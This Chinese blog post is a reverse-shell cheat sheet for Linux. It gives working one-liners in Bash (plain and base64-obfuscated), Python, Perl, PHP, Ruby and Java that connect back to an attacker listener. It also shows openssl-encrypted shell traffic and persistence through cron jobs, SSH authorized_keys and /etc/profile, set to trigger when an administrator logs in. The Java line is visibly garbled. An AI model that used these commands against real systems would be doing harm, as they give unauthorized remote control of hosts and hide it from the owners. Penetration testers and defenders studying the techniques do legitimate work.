**目录**

[Bash反弹shell](#t0)

[加密bash反弹shell的流量](#t1)

[Python反弹shell](#t2)

[其他命令反弹shell](#t3)

[写入命令到定时任务文件](#t4)

[写入SSH公钥](#t5) 

[写入/etc/profile文件](#t6)

* * *

当我们可以在远程Linux主机上执行任意命令或写入任意数据到任意文件的时候，我们通常会通过以下方式控制远程主机。

### Bash反弹shell

Linux 反弹 shell 使用下面这条命令，该命令弹回来的shell是不可交互的，也就是比如 vim、passwd 命令不能用

```
bash -i >& /dev/tcp/192.168.10.27/4444 0>&1   #将shell环境转发到192.168.10.32的4444端口上       
也可以如下：      
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjI3LzQ0NDQgMD4mMSA=}|{base64,-d}|{bash,-i}
```


然后客户端用 netcat 进行接收

```
nc -lvp  4444  #监听4444端口
```


![](https://img-blog.csdnimg.cn/20181201000005599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用什么样的用户反弹的 shell，还是当前用户的权限。

![](https://img-blog.csdnimg.cn/2019072713394969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注：只有拥有 /bin/bash 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)

![](https://img-blog.csdnimg.cn/20190727134148927.png)

**那么，这条命令的原理是什么呢？**

首先，bash -i 是打开一个交互式的bash终端。传送门—> [Linux中的shell和bash](https://blog.csdn.net/qq_36119192/article/details/84641554)

/dev/tcp/ 是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。所以，不难理解，/dev/tcp/192.168.10.32/4444   这条命令是意思就是和192.168.10.32主机的4444端口建立一个socket连接。传送门—> [Socket套接字和Sockes协议](https://blog.csdn.net/qq_36119192/article/details/83825685)

那么，最难的来了，**\>&**  和  **0>&1** 是什么意思呢？

要想了解  >&  和  0>&1 ，首先我们了解一下Linux文件描述符和重定向。

linux shell下常用的文件描述符是：

*   标准输入   (stdin) ：代码为 0 ，使用 < 或 << 
*   标准输出   (stdout)：代码为 1 ，使用 > 或 >> 
*   标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>

而通过查阅资料，发现  **>&** 和 **&>** 两者一个意思，都是将标准错误输出合并到标准输出中。

意思就是，如果我们执行一个命令，比如 ls -lh > test ，这样的话，test文件中只会保存我们执行这个命令正常的结果

而如果我们执行命令 ls -lh  >& test 或者 ls -lh &> test  ，这样的话，test文件中既会保存我们执行这个命令正常的结果，也会保存我们执行这个命令出错了的结果。

所以，当我们执行命令：bash -i >& /dev/tcp/192.168.10.32/4444    时，他会与192.168.10.32的4444号端口建立一个socket连接，把bash的标准输出和标准错误输出发给192.168.10.32。也就是获得了他的shell，但是192.168.10.32却不能进行操作。

而通过查阅资料发现， **0>&1**  和   **0<&1**  也是一个意思，都是将标准输入重定向到标准输出中。所以加入 0>&1 的话，就可以接受用户的输入了。

所以，结合上面的：bash -i >& /dev/tcp/192.168.10.32/4444  0>&1   命令是意思是：与192.168.10.32的4444端口建立一个socket连接，把bash的标准输出和标准错误输出发给192.168.10.32。并且可以接受输入，也就是可以进行交互式操作！

所以，学习了这些我们知道，以下这些命令其实都可以用于linux反弹shell。

```
bash -i >& /dev/tcp/192.168.10.27/4444 0>&1       
bash -i >& /dev/tcp/192.168.10.27/4444 0<&1       
bash -i $> /dev/tcp/192.168.10.27/4444 0>$1       
bash -i $> /dev/tcp/192.168.10.27/4444 0<&1
```


但是，很多时候，由于我们获取的shell并不是一个具有完整交互的shell，因此可能会在使用过程中被挂起，甚至还可能会因为我们的操作失误，例如不小心摁下了  Ctrl-C ，这将直接终止我们的整个shell进程。或者获得的shell类型是 sh 的，我们使用不习惯

如果目标主机有python环境，我们在用netcat获得了反弹的shell后，可以执行下面的命令，才获得一个正常的shell (可以进行交互的shell) ，可以执行 passwd 命令 ，但是 vim命令还是用不了

```
python -c 'import pty;pty.spawn("/bin/bash")'
```


![](https://img-blog.csdnimg.cn/20181201093916411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 加密bash反弹shell的流量

第一步，在vps上生成SSL证书的[公钥](https://so.csdn.net/so/search?q=%E5%85%AC%E9%92%A5&spm=1001.2101.3001.7020)/私钥对，执行以下命令，一路回车即可

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```


![](https://img-blog.csdnimg.cn/20200830111138553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

第二步，在VPS监听反弹shell

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```


第三步，在目标上用openssl加密反弹shell的流量

```
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.136:4444 > /tmp/s;rm /tmp/s
```


### ![](https://img-blog.csdnimg.cn/20200830111450286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Python反弹shell

使用下面这条命令弹回来的shell也是不可交互的shell，即 vim 和 passwd 等命令用不了

```
#利用python反弹一个bash类型的shell      
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```


![](https://img-blog.csdnimg.cn/20181207140425638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用什么样的用户反弹的 shell，还是当前用户的权限。

![](https://img-blog.csdnimg.cn/20190727134538912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

注：只有拥有 /bin/bash 的用户，才能使用该命令，如apache等web用户，无法使用该命令(以下是使用菜刀连接的webshell，获取到的 shell 是 apache 的shell)

![](https://img-blog.csdnimg.cn/20190727134653701.png)

### 其他命令反弹shell

```
Perl：      
perl -e 'use Socket;$i="192.168.10.13";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'       
PHP：      
php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'       
Ruby：      
ruby -rsocket -e'f=TCPSocket.open("192.168.10.13",8888).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'       1
Java：      1
r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.13/8888;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[]) p.waitFor()
```


![](https://img-blog.csdnimg.cn/20200503181031496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020050318110512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 写入命令到定时任务文件

我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/当前用户命令的文件  内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(debian系列主机)

```
*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1      
#每隔一分钟，向192.168.10.27的4444号端口发送shell
```


### 写入SSH公钥 

将公钥信息传送到远程主机的 /root/.[ssh](https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020)/ 目录下，并且重命名为  authorized\_keys 。如果是其他用户，比如test，那就是 /test/.ssh/ 下。

详细：[写入SSH公钥，进行远程登录](https://blog.csdn.net/qq_36119192/article/details/84620648#%C2%A0%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5%EF%BC%8C%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95)

### 写入/etc/profile文件

将以下命令写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。

```
/bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1 &
```


![](https://img-blog.csdnimg.cn/20190427185154347.png)

当管理员远程连接该主机时，就会执行该命令。

![](https://img-blog.csdnimg.cn/2019042718510772.png)

参考文章：[http://bobao.360.cn/learning/detail/3616.html](http://bobao.360.cn/learning/detail/3616.html)

相关文章：[Msfvenonm生成一个后门木马](https://blog.csdn.net/qq_36119192/article/details/83869141)

                  [linux反弹完全交互shell](https://www.imbeee.com/2017/12/24/full-functional-reverse-shell/)

                  [Reverse shell cheatsheet](https://krober.biz/misc/reverse_shell.php)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10949 人正在系统学习中